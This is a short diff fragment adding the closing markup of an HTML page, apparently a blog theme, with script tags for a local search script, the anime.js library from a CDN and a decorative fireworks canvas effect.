+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
